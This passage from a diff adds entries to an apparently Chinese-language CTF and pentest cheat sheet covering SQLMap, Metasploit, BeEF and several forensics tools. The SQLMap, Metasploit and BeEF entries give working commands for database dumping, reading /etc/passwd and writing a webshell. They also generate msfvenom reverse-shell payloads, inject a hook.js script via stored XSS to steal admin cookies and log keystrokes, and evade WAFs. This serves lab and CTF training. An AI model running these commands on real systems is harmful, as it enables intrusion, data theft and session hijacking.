|\n| 找不到成功响应 | 成功标志判断错 | 手动看响应内容，用 Grep-Match 特征词定位 |\n\n#### 实战要点\n- 单参数爆破用 Sniper；用户密码配对用 Pitchfork；全组合摸底用 Cluster bomb——按场景选，勿混。\n- CTF/靶场常见弱口令直接用 Pitchfork + 常见用户/密码短字典，几秒出结果。\n- 结果表按 Length 排序是找异常响应的最快方式，登录成功页通常更长。\n- Grep-Match 加上「失败特征词」，成功条目一眼可见。\n- 先在 Repeater 里手动试一次确认请求可重放、参数名正确，再上 Intruder。"
+        }
+      ]
+    },
+    {
+      "id": "g-exp",
+      "name": "漏洞利用框架",
+      "intro": "注入、漏洞利用与浏览器攻击",
+      "entries": [
+        {
+          "id": "sqlmap",
+          "title": "SQLMap 参数速查",
+          "tags": [
+            "sqlmap",
+            "sql",
+            "injection"
+          ],
+          "aliases": [
+            "sqlmap",
+            "注入"
+          ],
+          "difficulty": "easy",
+          "summary": "SQLMap 是 SQL 注入自动化之王，从检测到脱库到 getshell 一条龙，重点是参数组合。",
+          "content": "\n#### 这个条目的作用\nsqlmap 是自动化 SQL 注入工具：给它一个带参数的 URL，它能自动检测注入点，然后一步步把数据库、表、字段、数据全拖出来，甚至在条件允许时读写文件、执行系统命令。日常渗透和 CTF 里「拿注入点 -> 出数据」基本就靠它。\n\n#### 前置条件\n- 装有 sqlmap（Kali 自带；其他系统 `pip install sqlmap`）\n- 已发现一个带参数的 URL（如 `http://target.com/item.php?id=1`）\n- 已确认目标授权（自动化注入流量特征明显）\n\n#### 第 1 步：基础检测\n操作：把 URL 用双引号包住传给 `-u`，加 `--batch` 全自动应答。\n\n```bash\nsqlmap -u \"http://target.com/item.php?id=1\" --batch\n```\n\n预期结果：先做注入点检测，打印 `Parameter: id (GET)` 和 `is vulnerable` 等结论；接着自动收集库版本、用户等信息。\n\n如果不行：报 `connection timed out` 先确认目标可达；提示后端返回异常，试试把 `--batch` 拆掉手动选择测试级别，或给 `--random-agent` 伪装 UA。\n\n#### 第 2 步：从 Burp 请求文件读取目标\n操作：Burp 里右键请求 `Copy to file` 存成 request.txt，用 `-r` 加载（自动带上 Cookie、Header）。\n\n```bash\nsqlmap -r request.txt --batch\n```\n\n预期结果：sqlmap 解析出完整请求头与 POST 体，提示检测到的可注入参数；比手敲 `-u` 更稳，尤其带登录态时。\n\n如果不行：`request.txt` 必须是 Burp 导出的原始请求格式（含 `POST /xxx HTTP/1.1` 头行）；手工拷贝时会丢格式，用右键导出最稳。\n\n#### 第 3 步：枚举数据库、表、字段、数据\n操作：按层级递进：`--dbs` 看库 -> `-D 库名 --tables` 看表 -> `-T 表名 --columns` 看字段 -> `-C 字段 --dump` 导出数据。\n\n```bash\nsqlmap -u \"http://target.com/item.php?id=1\" --dbs --batch\nsqlmap -u \"http://target.com/item.php?id=1\" -D ctfdb --tables --batch\nsqlmap -u \"http://target.com/item.php?id=1\" -D ctfdb -T users --columns --batch\nsqlmap -u \"http://target.com/item.php?id=1\" -D ctfdb -T users -C username,password --dump --batch\n```\n\n预期结果：`--dbs` 列出数据库名；`-D ... --tables` 列出表名；`--dump` 把整表数据以表格形式打印并保存到本地 CSV。\n\n如果不行：提示 `no parameter(s) found for testing` 说明注入点在这级参数上没测出来，加 `--level 3`（见第 7 步）；`--dump` 卡在破解密码哈希属正常（弱口令可配合 hashcat 条目）。\n\n#### 第 4 步：查当前库、用户、权限\n操作：确认当前数据库是什么、数据库账号是谁、有没有 DBA 权限——决定后续能玩多大。\n\n```bash\nsqlmap -u \"http://target.com/item.php?id=1\" --current-db --current-user --is-dba --batch\n```\n\n预期结果：输出 `current database: 'ctfdb'`、`current user: 'root@localhost'`、`current user is DBA: True` 等行。\n\n如果不行：`is-dba` 结果为空说明权限探测被限，没关系，继续按注入点拖数据即可；重点关注 DBA 是否为 True，决定文件/命令操作可行性。\n\n#### 第 5 步：文件读与写\n操作：DBA + FILE 权限下可以读服务器文件、写 webshell。\n\n```bash\nsqlmap -u \"http://target.com/item.php?id=1\" --file-read=/etc/passwd --batch\nsqlmap -u \"http://target.com/item.php?id=1\" --file-write=/tmp/shell.php \\\n  --file-dest=/var/www/html/shell.php --batch\n```\n\n预期结果：`--file-read` 把文件内容打印出来；`--file-write` 报 `the local file has been successfully written`。\n\n如果不行：`--file-read` 报错先确认 `--is-dba` 和数据库 `secure_file_priv`（MySQL 为 NULL 时不能写）；写文件目录要对（用前面枚举或目录扫描确认 web 根目录），写不进去换个可写目录。\n\n#### 第 6 步：命令执行\n操作：权限够（DBA + FILE + 能出网）时用 `--os-shell` 交互式执行系统命令。\n\n```bash\nsqlmap -u \"http://target.com/item.php?id=1\" --os-shell --batch\n# 进入后直接输命令\n```\n\n预期结果：提示选择脚本语言（php/perl/asp）后进入 `os-shell>` 提示符，输入 `id`、`whoami` 等直接回显。\n\n如果不行：`--os-shell` 失败优先查两个前提：`--is-dba` 是否为 True、`secure_file_priv` 是否放行；两者其一受限就退回 `--file-write` 手动传 shell。\n\n#### 第 7 步：进阶参数组合\n操作：检测不到注入、过 WAF、控速时按需加参数。\n\n```bash\nsqlmap -u \"http://target.com/item.php?id=1\" --level 3 --risk 2 --threads 5 --batch\nsqlmap -u \"http://target.com/item.php?id=1\" --cookie \"session=xxx\" \\\n  --proxy \"http://127.0.0.1:8080\" --tamper=space2comment --batch\nsqlmap -u \"http://target.com/item.php?id=1\" -p id --dbms=mysql --time-sec 5 --batch\n```\n\n| 参数 | 作用 |\n|---|---|\n| -u / -r | URL 目标 / 请求文件目标 |\n| --batch | 全部默认选项，非交互 |\n| --dbs / -D / -T / -C | 库/表/列层级枚举 |\n| --dump | 导出数据 |\n| --os-shell | 数据库命令执行（需高权限加 FILE） |\n| --level / --risk | 测试深度与风险等级（越高越慢越全） |\n| --threads | 并发线程 |\n| --tamper | 绕过 WAF 的变形脚本 |\n| --time-sec | 时间盲注延迟秒数 |\n| -p | 指定要测的参数名 |\n\n预期结果：`--level 3 --risk 2` 会把测试扩展到更多注入点与更野的 payload；`--tamper=space2comment` 把空格替换成注释绕过简单 WAF。\n\n如果不行：`--level 3` 会把测试时间放大很多倍，先 `--dbs` 小范围验证；tamper 生效但绕过失败就换别的脚本（列表用 `sqlmap --list-tampers` 查看）。\n\n> [!tip] 授权渗透用 --batch 避免交互卡死；--os-shell 失败先查 --is-dba 与 secure_file_priv。\n\n> [!warn] --dump 大数据量非常慢且流量特征明显，先 --count 评估数据量再决定是否全量导出。\n\n#### 常见错误与排查\n\n| 现象 | 原因 | 解决 |\n|---|---|---|\n| no parameter(s) found | 注入点级别低或参数没测 | 加 --level 3 --risk 2，-p 指定参数 |\n| 检测超时/连接失败 | 目标慢或请求被拦 | 加 --timeout 与 --retries，或 --proxy 走代理 |\n| 登录态丢失 | 未带 Cookie | 用 -r 请求文件或加 --cookie |\n| --os-shell 失败 | 无 DBA / FILE 权限 | 查 --is-dba、secure_file_priv，改 --file-write 传 shell |\n| --dump 极慢 | 数据量大或时间盲注 | 先 --count 估量，只 -C 选关键字段 |\n| WAF 拦截 | 请求特征被识别 | --tamper 换脚本、--random-agent、限速 --delay |\n| Unknown parameter | URL 带了特殊符号 | URL 整体用双引号包住，& 等符号不被 shell 拆解 |\n\n#### 实战要点\n- 标准流程一条龙：`--dbs -> -D --tables -> -T --columns -> --dump`，层级别跳。\n- 自动检测不到就 `--level 3 --risk 2`，再手动 `-p` 指定参数。\n- `--batch` 非交互必备，否则跑一半卡在提问上。\n- getshell 路径：`--is-dba` 确认权限 -> `--file-write` 传 shell，优先于 `--os-shell`。\n- 拿到的数据（尤其密码哈希）交 hashcat 破解是常见组合拳。"
+        },
+        {
+          "id": "metasploit",
+          "title": "Metasploit 流程与 msfvenom",
+          "tags": [
+            "metasploit",
+            "msfvenom",
+            "payload"
+          ],
+          "aliases": [
+            "msf",
+            "msfconsole"
+          ],
+          "difficulty": "medium",
+          "summary": "Metasploit 集成漏洞利用、后渗透与 payload 生成，流程固定：搜索、选用、配置、执行。",
+          "content": "\n#### 这个条目的作用\nMetasploit（MSF）是一套漏洞利用框架：内置上千个漏洞利用模块（exploit）、payload 生成器（msfvenom）和会话管理（meterpreter 后渗透）。打靶机/复现 CVE 的标准姿势就是：进 msfconsole -> 搜模块 -> 配置参数 -> 执行拿 shell。\n\n#### 前置条件\n- 装有 Metasploit：`apt install metasploit-framework` 或 Kali 自带；`msfconsole --version` 验证\n- 已经过信息收集：目标 IP、开放端口、服务版本\n- 已确认目标上的服务存在对应漏洞（用 nmap 指纹配合搜模块）\n\n#### 第 1 步：进入 msfconsole 并搜索模块\n操作：启动控制台，用 `search` 按关键字、类型、平台过滤找模块。\n\n```bash\nmsfconsole\nsearch vsftpd                          # 按软件名搜\nsearch type:exploit platform:linux     # 按类型+平台过滤：linux 的 exploit\nsearch cve:2017                     # 按 CVE 编号搜\n```\n\n预期结果：打印模块列表，每行有模块路径（如 `exploit/unix/ftp/vsftpd_234_backdoor`）、评分、披露日期等。\n\n如果不行：`search` 无结果显示数据库没初始化或关键字不对，先 `search type:exploit` 看能不能列出东西；模块名记不全时用关键字部分匹配。\n\n#### 第 2 步：使用模块并查看信息\n操作：`use` 选中模块，`info` 看漏洞描述与适用版本，`show options` 看必填参数。\n\n```bash\nuse exploit/unix/ftp/vsftpd_234_backdoor\ninfo\nshow options\n```\n\n预期结果：`info` 给出该漏洞详情与受影响版本；`show options` 列出参数表，`Required` 列为 yes 的是必填，`Current Setting` 列显示当前值。\n\n如果不行：`use` 报找不到模块先核对路径是否完整；`show options` 为空说明没正确 use。\n\n#### 第 3 步：配置目标参数\n操作：用 `set` 填必填参数（RHOSTS 目标、RPORT 端口等）。\n\n```bash\nset RHOSTS 192.168.1.10\nset RPORT 21\nshow options\n```\n\n预期结果：`show options` 里 RHOSTS 从空变为 `192.168.1.10`；RPORT 变成 21。\n\n如果不行：参数名大小写敏感（`set rhosts` 会报无效参数），对照 `show options` 里的列名原样填写；RHOSTS 是复数写法（可填网段/文件），单目标也用它。\n\n#### 第 4 步：配置 payload 与回连参数\n操作：`set PAYLOAD` 选反弹 shell 类型，`set LHOST`（你的 IP，payload 回连到谁）、`set LPORT`。\n\n```bash\nset PAYLOAD linux/x86/shell_reverse_tcp\nset LHOST 192.168.1.100        # 攻击机 IP，必要时先 ip addr 确认\nset LPORT 4444\n```\n\n预期结果：`show options` 出现 PAYLOAD/LHOST/LPORT 且已填值；`LHOST` 是必填，不填执行必失败。\n\n如果不行：反弹 shell 的 LHOST 必须是目标能连回你的地址——靶场 NAT 环境填内网 IP，公网目标要填公网 IP 或做好端口映射；先 `ip addr` 确认攻击机 IP 再填。\n\n#### 第 5 步：执行并管理会话\n操作：`run`（或 `exploit`）触发利用，成功后进入会话。\n\n```bash\nrun\nsessions -l          # 列出所有会话\nsessions -i 1        # 进入第 1 个会话\nbackground           # 把当前会话挂后台返回 msf 提示符\n```\n\n预期结果：`run` 后目标反弹连接，打印 `Meterpreter session 1 opened` 或 `Command shell session 1 opened`；在会话里能执行命令。\n\n如果不行：`run` 后卡住/超时，先确认 LHOST/LPORT 填对、目标端口真开放、payload 类型与目标系统架构匹配（x86 打 x64 会段错误）；利用失败改看 `info` 里漏洞对应服务版本是否真的命中。\n\n#### 第 6 步：msfvenom 生成自定义 payload\n操作：`msfvenom` 单独生成 payload 文件：`-p` payload、`LHOST/LPORT`、`-f` 输出格式、`-o` 输出文件。\n\n```bash\n# Windows exe\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=1.2.3.4 LPORT=4444 -f exe -o shell.exe\n# Linux elf\nmsfvenom -p linux/x64/shell_reverse_tcp LHOST=1.2.3.4 LPORT=4444 -f elf -o shell\n# PHP\nmsfvenom -p php/meterpreter_reverse_tcp LHOST=1.2.3.4 LPORT=4444 -f raw -o shell.php\n# Python\nmsfvenom -p python/meterpreter/reverse_tcp LHOST=1.2.3.4 LPORT=4444 -o shell.py\n```\n\n预期结果：生成的文件存在，`file shell.exe` 显示对应格式（PE32 executable 等）；大小在几 KB 到几十 KB。\n\n如果不行：`--list payloads` 可看全部 payload 名单；格式参数写错（`-f exe` 用于 exe，`-f raw` 用于脚本类）会报错，按表里对照。\n\n#### 第 7 步：起监听接收反弹 shell\n操作：payload 传出去之前先在本机起 handler 监听，保证回连有地方接。\n\n```bash\nuse exploit/multi/handler\nset PAYLOAD windows/meterpreter/reverse_tcp\nset LHOST 0.0.0.0\nset LPORT 4444\nrun\n```\n\n预期结果：`run` 后进入等待状态（`Started reverse TCP handler`），目标执行 payload 后打印会话建立提示。\n\n如果不行：监听 payload 必须与传给目标的 payload 完全一致（名字、LHOST、LPORT 至少端口一致），不一致接不到；防火墙挡了端口就 `netstat -tlnp` 排查，或换端口。\n\n> [!tip] 反弹后先 getuid、sysinfo、shell 进交互式命令；meterpreter 会话比普通 shell 功能全。\n\n> [!warn] msfvenom 默认 payload 基本被杀软查杀，免杀需配合编码或分离加载，生产环境慎用。\n\n#### 常见错误与排查\n\n| 现象 | 原因 | 解决 |\n|---|---|---|\n| exploit 失败/超时 | 目标是 x64 用了 x86 payload、端口不对、模块版本不符 | 核对架构与端口，重选 payload/模块 |\n| 反弹 shell 收不到 | LHOST/LPORT 填错、防火墙拦截 | 确认攻击机 IP、端口放行，监听与 payload 一致 |\n| sessions 列表为空 | 没有成功建立会话 | 回到 run 排查利用是否真的成功 |\n| msfvenom 报错 Unknown payload | payload 名字拼错 | `msfvenom --list payloads` 查准确名字 |\n| 生成的 shell 被杀软报毒 | 裸 payload 特征明显 | CTF/授权环境优先用 `linux/x64/shell_reverse_tcp` 或加密编码，实战需免杀方案 |\n| database not initialized | 未初始化 msf 数据库 | `msfdb init` 后重启 msfconsole |\n\n#### 实战要点\n- 固定流程四步走：`search -> use -> set 参数 -> run`，先 `show options` 看必填项。\n- 反弹型 payload 三件套必填：PAYLOAD、LHOST、LPORT，缺一个必失败，LHOST 先用 `ip addr` 确认。\n- 靶机 Linux 就用 `linux/x64/shell_reverse_tcp`（x64）或 `linux/x86`，别拿 Windows payload 硬套。\n- 监听与 payload 全程保持端口一致；meterpreter 里 `getuid`/`sysinfo` 先摸底。\n- msfvenom 生成的文件目标机器码要匹配架构（x64 目标用 x64 payload），格式按表选。"
+        },
+        {
+          "id": "beef",
+          "title": "BeEF 浏览器利用框架",
+          "tags": [
+            "beef",
+            "xss",
+            "browser"
+          ],
+          "aliases": [
+            "beef",
+            "浏览器攻击"
+          ],
+          "difficulty": "medium",
+          "summary": "BeEF 专注浏览器端攻击，配合存储型 XSS 挂 hook 后即可对受害者浏览器执行模块化利用。",
+          "content": "\n#### 这个条目的作用\n一句话：BeEF（Browser Exploitation Framework）是专门攻击「浏览器」的工具。你先把一小段 JS（hook.js）想办法塞进目标网页，之后只要有人用浏览器打开这个页面，他的浏览器就会自动连回你的 BeEF 控制台，你就能远程对这台浏览器执行偷 Cookie、键盘记录、截图、钓鱼等模块化操作。\n\n#### 前置条件\n- 一台 Kali/Ubuntu 主机（BeEF 主要在 Linux 上跑），能访问目标页面。\n- 一个能往页面里注入脚本的入口（最常用：存储型 XSS 留言板，或你自己搭的钓鱼页）。\n- 会往页面里写脚本标签，例如 `<script src=\"http://你的IP:3000/hook.js\"></script>`。\n- 目标浏览器能访问你的 IP 端口（同网段或公网可达），防火墙不要拦 3000 端口。\n\n#### 第 1 步：安装 BeEF\n操作：Kali 自带，直接启动；其他系统用 git 装。\n命令：\n```bash\n# Kali（自带，直接启动）\nsudo beef-xss\n\n# 源码安装（任意 Linux）\ngit clone https://github.com/beefproject/beef\ncd beef\nsudo ./install        # 自动装 ruby 依赖\nsudo ./beef\n```\n预期结果：终端显示 BeEF 已启动，并打印 UI 地址（默认 http://127.0.0.1:3000/ui/panel）和默认账号。\n如果不行：`./install` 报缺依赖，先 `sudo apt install ruby-dev build-essential libsqlite3-dev` 再重试；端口被占用就改 `config.yaml` 里的 `http.port`。\n\n#### 第 2 步：登录控制台\n操作：浏览器打开 http://127.0.0.1:3000/ui/panel，输入默认账号。\n命令/配置：默认用户名 `beef`，密码 `beef`（首次登录会要求改密码）。\n预期结果：进入左侧是命令树、右侧空白的控制台界面。\n如果不行：登不进去看第 1 步启动日志里打印的账号密码；忘记密码就删掉 `beef.db` 重启恢复默认。\n\n#### 第 3 步：把 hook 注入目标页面\n操作：找到你能控制内容的页面（如留言板），把 hook 脚本标签贴进去并保存。\n命令：往可注入位置写入\n```html\n<script src=\"http://你的IP:3000/hook.js\"></script>\n```\n预期结果：受害者打开该页面后，浏览器加载这段 JS，BeEF 控制台「Online Browsers」区出现一个绿色圆点（新上线浏览器）。\n如果不行：页面是 HTTPS 而你的 hook 是 HTTP，浏览器会因混合内容拦截——hook 地址改 HTTPS（BeEF 默认同时监听 6789 HTTPS 端口，用 `https://IP:6789/hook.js`）；或先自己访问一次注入页面确认注入点本身有效。\n\n#### 第 4 步：确认浏览器上线\n操作：控制台左侧点开上线浏览器的 IP 条目，查看它的系统、浏览器版本、插件信息。\n预期结果：能看到受害者浏览器指纹，说明 hook 成功、可以开始攻击。\n如果不行：浏览器没上线，先在受害者机器手动访问一次注入页面并保持打开，排除「页面根本没被访问」的情况。\n\n#### 第 5 步：执行模块\n操作：选中上线浏览器 → 左侧「Commands」树选择模块 → 点右上 Execute。\n常用模块路径：\n| 想做什么 | 模块路径 |\n|---|---|\n| 偷 Cookie | Commands → Browser → Hooked Domain → Get Cookie |\n| 键盘记录 | Commands → Browser → Keylogger |\n| 屏幕截图 | Commands → Browser → Screenshot |\n| 内网探测 | Commands → Network → 内网探测类模块 |\n预期结果：模块状态变为 Completed/Finished，右侧结果区显示返回数据（如 Cookie 值）。\n如果不行：模块返回 error 多为目标浏览器不支持该特性，换一个同类模块试。\n\n#### 第 6 步：典型玩法——偷管理员 Cookie\n操作：留言板注入 hook → 等管理员打开后台页 → Get Cookie 拿 session → 自己在浏览器替换 Cookie 登入后台。\n命令：得到 Cookie 后，用浏览器开发者工具（F12 → Application → Cookies）把对应字段改成偷到的值。\n预期结果：能以管理员身份访问后台。\n> [!warn] 在授权范围外对他人浏览器挂 hook 属违法行为；只在自己靶场、CTF 题目或获得授权的环境中使用。\n\n#### 常见错误与排查\n| 现象 | 原因 | 解决 |\n|---|---|---|\n| 浏览器一直不上线 | hook.js 地址不可达或端口被防火墙拦 | 受害者机器先 curl 测 `http://IP:3000/hook.js` 能否返回 JS |\n| 控制台登录失败 | 默认密码被改或数据库残留旧密码 | 删 beef.db 重启恢复 beef/beef |\n| HTTPS 页面 hook 不执行 | 混合内容（HTTPS 页加载 HTTP 脚本）被浏览器拦截 | hook 地址改用 `https://IP:6789/hook.js` |\n| 模块执行报 error | 目标浏览器版本不支持该模块特性 | 换同类模块；老浏览器兼容性最好 |\n\n#### 实战要点\n- hook 注入点首选存储型 XSS：留言板、评论、用户昵称，一次注入长期生效。\n- 上线后第一时间 Get Cookie + 键盘记录，这两样信息价值最高。\n- 页面必须保持打开，受害者一关页面浏览器就掉线，别等太久。\n- hook 脚本会被 WAF/过滤器拦截，可对 `<script>` 做编码混淆或改用 img 标签触发。\n- 先在自己浏览器上验证整条链路（上线→模块→数据返回），再投入实战。"
+        }
+      ]
+    },
+    {
+      "id": "g-fore",
+      "name": "取证与解码",
+      "intro": "编解码、隐写、流量分析",
+      "entries": [
+        {
+          "id": "cyberchef",
+          "title": "CyberChef 常用配方",
+          "tags": [
+            "cyberchef",
+            "decode",
+            "encode"
+          ],
+          "aliases": [
+            "cyberchef",
+            "编码解码"
+          ],
+          "difficulty": "easy",
+          "summary": "网络版瑞士军刀，可视化拖拽编解码，从 Base64 到 XOR 爆破一条龙。",
+          "content": "\n#### 这个条目的作用\nCyberChef 是 GCHQ 开源的网页版「编码瑞士军刀」：左边是配方列表，中间是 Recipe（配方）区，右边是输入输出。CTF 里 90% 的编解码题——Base64、Hex、URL、ROT、XOR、压缩——拖几个模块进去就能解开，不用装任何本地脚本。\n\n#### 前置条件\n- 能打开网页的浏览器（访问 https://gchq.github.io/CyberChef/，在线版无需安装）。\n- 一份待解码的密文（题目给的字符串或文件内容）。\n- 会复制粘贴文本，会拖拽鼠标。\n\n#### 第 1 步：打开并粘贴密文\n操作：访问 CyberChef 在线版，把密文粘贴到右上「Input」框。\n预期结果：Input 区显示你的密文，Output 区暂时是原样或乱码。\n如果不行：密文在文件里就先打开文件复制；Input 框内容太多可以点右下角齿轮调字号。\n\n#### 第 2 步：先拖 Magic 自动解码\n操作：左侧搜索框输入 Magic，把「Magic」模块拖到中间 Recipe 区。\n预期结果：Output 区自动变成可读文本（Magic 会尝试识别 Base64/Hex/URL/ROT 等常见编码）。\n如果不行：Magic 识别错或解不出来，说明是多层编码或冷门算法，继续第 3 步手动组合。\n\n#### 第 3 步：手动逐层解码\n操作：按「外层到内层」顺序叠加模块：先 URL Decode → From Base64 → From Hex → ROT13，解一层看一层输出。\n命令：Recipe 区依次拖入并保持从上到下排列：\n```txt\nURL Decode\nFrom Base64\nFrom Hex\nROT13\n```\n预期结果：每拖入一个模块，Output 立即更新；解到某一步出现 `flag{...}` 或可读句子即完成。\n如果不行：解到某层输出变成乱码，说明层顺序不对或这层不是该编码，把该模块删掉换别的（如 From CharCode、From Binary）。\n\n#### 第 4 步：XOR 爆破\n操作：怀疑是单字节 XOR 时，拖入「XOR Brute Force」模块。\n命令：模块参数 Key Length 设为 1（或 1-2），勾选「Intensive」选项。\n预期结果：输出列出多个候选明文，其中一条是可读的 flag。\n如果不行：1 字节爆破不出可读文本，试 Key Length 2；或先拖 Magic 看它是否提示 XOR 可能性。\n\n#### 第 5 步：处理压缩/文件类数据\n操作：密文解出是 gzip/zip 二进制时，拖「Gunzip」或「Extract Files」。\n命令：压缩数据先 From Base64/From Hex 还原二进制，再拖 Gunzip；内含文件用 Extract Files 一次抽出。\n预期结果：Output 变成解压后的内容，或 Extract Files 面板列出提取出的文件名可下载。\n如果不行：Gunzip 报错说明数据头不对，确认前一步是否真的还原成了原始二进制（看 Output 是否出现 `1f 8b` 等魔数）。\n\n#### 第 6 步：保存与分享配方\n操作：Recipe 区完成后，点右上「Save」把配方存成 .recipe 文件，或复制「Get recipe link」分享链接。\n预期结果：下次做题直接导入配方一键重跑。\n> [!tip] 把「Magic → URL Decode → From Base64 → From Hex → ROT13」存成常用配方，新题先套这个再分析。\n\n#### 常见错误与排查\n| 现象 | 原因 | 解决 |\n|---|---|---|\n| Magic 解出来是乱码 | 多层编码或编码类型冷门 | 手动分层解，每层看一次输出判断方向 |\n| From Base64 报错 | 密文含换行/空格污染 | 先加「Remove Line Breaks」模块再解码 |\n| 解到一半输出全是 0 和 1 | 上一步其实是二进制层 | 补一个「From Binary」模块 |\n| Gunzip 失败 | 前面没还原成原始二进制 | 检查是否缺了 From Hex/From Base64 这一步 |\n\n#### 实战要点\n- 万能起手式：Magic 不行就 Base64 → Hex → URL → ROT → XOR 五连试。\n- 密文含大量特殊符号优先试 URL Decode；纯数字逗号分隔试 From CharCode。\n- 看到 Base64 特征（A-Za-z0-9+/ 且长度是 4 的倍数）先解一层再说。\n- 多层编码题每解一层就停一下观察，别一口气全拖上去。\n- 在线版数据只在本地浏览器处理，题目密文可以放心粘贴。"
+        },
+        {
+          "id": "strings-binwalk",
+          "title": "文件取证与隐写工具",
+          "tags": [
+            "strings",
+            "binwalk",
+            "foremost",
+            "stego"
+          ],
+          "aliases": [
+            "strings",
+            "binwalk",
+            "foremost"
+          ],
+          "difficulty": "easy",
+          "summary": "二进制与文件取证三件套：strings 看内容、binwalk 找内嵌、foremost 提取，处理图片固件流量包必备。",
+          "content": "\n#### 这个条目的作用\nCTF 的 misc/取证题常把 flag 藏在图片、压缩包、固件里：strings 直接翻出文件里的可打印字符串，binwalk 找出「文件里还嵌着别的文件」，foremost 按文件头把这些内嵌文件抠出来。三件套从上到下就是一条完整取证流水线。\n\n#### 前置条件\n- Linux 环境（Kali 自带；其他发行版需安装 binwalk、foremost，strings 属于 coreutils 自带）。\n- 一个可疑文件：图片（png/jpg）、压缩包、bin 固件或 pcap。\n- 基础命令常识：ls、cd、file、grep。\n\n#### 第 1 步：安装工具\n操作：确认三个工具都在。\n命令：\n```bash\nwhich strings binwalk foremost\nsudo apt install binwalk foremost   # 缺哪个装哪个（strings 无需装）\n```\n预期结果：三条路径都打印出来，或安装命令正常结束。\n如果不行：apt 找不到源，先 `sudo apt update`；非 Debian 系用对应包管理器（pacman/dnf）装同名的包。\n\n#### 第 2 步：file 与 strings 初筛\n操作：先看文件真实类型，再翻字符串找明文线索。\n命令：\n```bash\nfile mystery.png\nstrings mystery.png | grep -iE 'flag|key|password|ctf'\nstrings -n 6 mystery.png          # 只看长度 ≥6 的字符串，过滤噪声\nstrings -e l mystery.png          # 提取 UTF-16LE 字符串（Windows 程序常见）\n```\n预期结果：file 显示真实格式；grep 可能直接打出 flag 或提示性关键词。\n如果不行：没有命中就把 strings 输出存文件 `strings mystery.png > out.txt`，用编辑器慢慢翻；flag 常藏在图片信息段或文件尾部。\n\n#### 第 3 步：binwalk 扫描内嵌文件\n操作：扫描文件结构，看里面是否藏着别的文件。\n命令：\n```bash\nbinwalk mystery.png\n```\n预期结果：输出多行 DECIMAL/HEXADECIMAL/OCTAL 的「压缩包、Zlib、PNG」等结构标记，说明文件里嵌了内容；只有一行普通 PNG 结构则基本没内嵌。\n如果不行：binwalk 命令不存在就用第 1 步重装；提示需要 root 就加 sudo。\n\n#### 第 4 步：binwalk 自动提取\n操作：把内嵌文件全部解出来。\n命令：\n```bash\nbinwalk -e mystery.png\nls _mystery.png.extracted/\n```\n预期结果：生成 `_mystery.png.extracted` 目录，里面有提取出的文件（zip、txt 等）。\n如果不行：提取失败或目录为空，改用 `binwalk --dd='.*' mystery.png` 强制按所有文件头提取，或换 foremost（第 5 步）。\n\n#### 第 5 步：foremost 按文件头提取\n操作：binwalk 漏掉时用 foremost 按文件头魔数批量抠文件。\n命令：\n```bash\nforemost -i mystery.png -o /tmp/out\nfind /tmp/out -type f\n```\n预期结果：/tmp/out 下出现 audit.txt 和按类型分的目录（jpg、zip 等），find 列出全部提取物。\n如果不行：先确认文件确实含有别的文件头（`xxd mystery.png | tail` 看文件尾部有没有 zip 的 `PK` 魔数）；foremost 默认只认常见类型，`-t` 参数可指定类型。\n\n#### 第 6 步：解压提取物找 flag\n操作：对提取出的压缩包/文件继续操作。\n命令：\n```bash\ncd /tmp/out\nfile zip/00000000.zip\nunzip -o zip/00000000.zip\nstrings flag.txt\n```\n预期结果：解开压缩包（可能有密码，题目会在提示或文件名里给）后拿到 flag 文件，strings 或直接 cat 读出内容。\n如果不行：压缩包有密码就先找题目提示；内嵌多层就重复「binwalk → unzip → strings」循环直到出结果。\n\n> [!tip] 图片隐写标准套路：先 strings 找明文 → 再 binwalk -e 找内嵌 → 最后看文件尾部是否追加内容（`xxd file | tail`）。\n\n> [!warn] binwalk -e 可能解出多层嵌套目录，解完用 `find . -type f` 全列一遍，别漏掉深层文件。\n\n#### 常见错误与排查\n| 现象 | 原因 | 解决 |\n|---|---|---|\n| strings 输出全是乱码 | 文件是压缩/加密过的，没有明文 | 先 file 确认类型，再走 binwalk 流程 |\n| binwalk -e 目录为空 | 提取规则没覆盖该文件类型 | 用 `--dd='.*'` 强制提取或换 foremost |\n| unzip 要密码 | 内嵌压缩包被加密 | 找题目提示/文件名中的线索，常见密码是文件名或「password」 |\n| 提取出的文件打不开 | 提取不完整或文件损坏 | 重新用 `binwalk -D 'zip:zip'` 按指定类型精确提取 |\n\n#### 实战要点\n- 顺序永远是从外到内：file → strings → binwalk → 解压，一层层剥。\n- strings 加 `-n 6` 能滤掉大量二进制噪声，命中率更高。\n- 看到文件末尾有 `PK`（zip）或 `1f 8b`（gzip）魔数，直接 binwalk 或手动截取。\n- flag 可能被拆成多段分布在多个提取物里，全部文件都要翻。\n- 固件类题目（binwalk 解出 squashfs 文件系统）解出来记得看 /etc 和启动脚本。"
+        },
+        {
+          "id": "wireshark",
+          "title": "Wireshark 与 tshark 过滤语法",
+          "tags": [
+            "wireshark",
+            "tshark",
+            "pcap"
+          ],
+          "aliases": [
+            "wireshark",
+            "抓包分析"
+          ],
+          "difficulty": "medium",
+          "summary": "流量包分析核心技能，过滤语法在 Wireshark 顶部过滤栏与 tshark -Y 参数两处通用。",
+          "content": "\n#### 这个条目的作用\nWireshark 是图形化抓包/看包工具，tshark 是它的命令行版。CTF 流量题给你一个 .pcap，flag 往往藏在 HTTP 请求参数、明文 FTP/Telnet 口令、DNS 查询或某个文件传输里——会过滤和 Follow 流，就能在几千个包里几分钟定位目标。\n\n#### 前置条件\n- 装有 Wireshark（Kali 自带；`sudo apt install wireshark`）和 tshark（随 Wireshark 一起装）。\n- 一个 .pcap/.pcapng 流量包文件。\n- 基本概念：TCP 流、HTTP 请求/响应、IP/端口。\n\n#### 第 1 步：打开 pcap 文件\n操作：启动 Wireshark 打开题目 pcap。\n命令：\n```bash\nwireshark capture.pcap     # 图形界面打开\n```\n预期结果：主窗口列出几百上千个数据包，每行是 时间/源IP/目的IP/协议/长度/Info。\n如果不行：打不开说明文件损坏或不是标准 pcap，先 `file capture.pcap` 确认格式；没有图形环境就用 tshark（第 6 步）。\n\n#### 第 2 步：用显示过滤器缩小范围\n操作：在顶部过滤栏输入表达式回车；过滤不改变数据，只是隐藏不匹配的包。\n常用过滤器：\n```txt\nhttp                                  # 只看 HTTP 流量\nip.addr == 1.2.3.4                    # 只看某 IP 相关流量\ntcp.port == 80                        # 只看 80 端口\nhttp.request.method == POST           # 只看 POST 请求\ndns.qry.name contains \"flag\"          # DNS 查询里含 flag\nframe contains \"password\"             # 载荷里含 password 关键字\ntcp.stream eq 12                      # 只看第 12 条 TCP 